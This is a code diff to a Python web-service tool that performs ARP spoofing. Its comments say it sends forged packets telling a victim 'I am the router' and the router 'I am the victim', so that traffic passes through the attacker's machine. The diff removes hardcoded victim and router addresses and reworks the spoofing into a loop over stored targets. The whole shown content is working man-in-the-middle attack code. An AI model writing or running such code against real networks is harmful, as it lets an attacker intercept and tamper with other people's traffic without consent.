@@ -10,11 +10,6 @@ import time
 
 # Gloabal Variables
 ##############################################################################
-TARGET_IP = "10.0.2.15"                           # Target Ip Address
-TARGET_MAC_ADDR = "aa:bb:cc:dd:ee:ff"             # Target MAC Address
-ROUTER_IP = "10.0.2.1"                            # Router Ip Address
-ROUTER_MAC_ADDR = "11:22:33:44:55:66"             # Router MAC Address
-MITM_MAC_ADDR = "a1:b2:c3:d4:e5:f6"               # MITM(You) MAC Address
 OPERATION = 2                                     # Arp Response Package
 SLEEP_TIME = 2                                    # Sleep Time
 RESTORE_PKG_COUNT = 3                             # Restore Package Count
@@ -87,12 +82,6 @@ class ArpSpoof(Resource):
         else:
             my_mac_addr = get_my_mac_addr()
 
-        # Send Packet to the Victim to Say I am the Router
-        redirect_arp(target_ip_addr,target_mac_addr,router_ip_addr,my_mac_addr)
-
-        # Send Packet to the Router to Say I am the Victim
-        redirect_arp(router_ip_addr,router_mac_addr,target_ip_addr,my_mac_addr)
-
         spoof_dict = {"target_ip_addr"  : target_ip_addr ,
                       "target_mac_addr" : target_mac_addr,
                       "router_ip_addr"  : router_ip_addr,
@@ -100,7 +89,24 @@ class ArpSpoof(Resource):
                       "interceptor"     : my_mac_addr}
         
         SPOOFED_LIST.append(spoof_dict)
+##############################################################################
 
+
+# Send Spoof Packages
+##############################################################################
+def send_spoof_packages():
+    for spoofed in SPOOFED_LIST:
+        target_ip_addr  = spoofed['target_ip_addr']
+        target_mac_addr = spoofed['target_mac_addr']
+        router_ip_addr  = spoofed['router_ip_addr']
+        router_mac_addr = spoofed['router_mac_addr']
+        interceptor     = spoofed['interceptor']
+
+        # Send Packet to the Victim to Say I am the Router
+        redirect_arp(target_ip_addr,target_mac_addr,router_ip_addr,interceptor)
+
+        # Send Packet to the Router to Say I am the Victim
+        redirect_arp(router_ip_addr,router_mac_addr,target_ip_addr,interceptor)
 
 ##############################################################################
 
@@ -108,6 +114,7 @@ class ArpSpoof(Resource):
 if __name__ == '__main__':
     try:
         app.run(debug=DEBUG,port=PORT)
+        send_spoof_packages()
     except KeyboardInterrupt:
         print("\n[-] Arp Tables Restoring...")
         '''
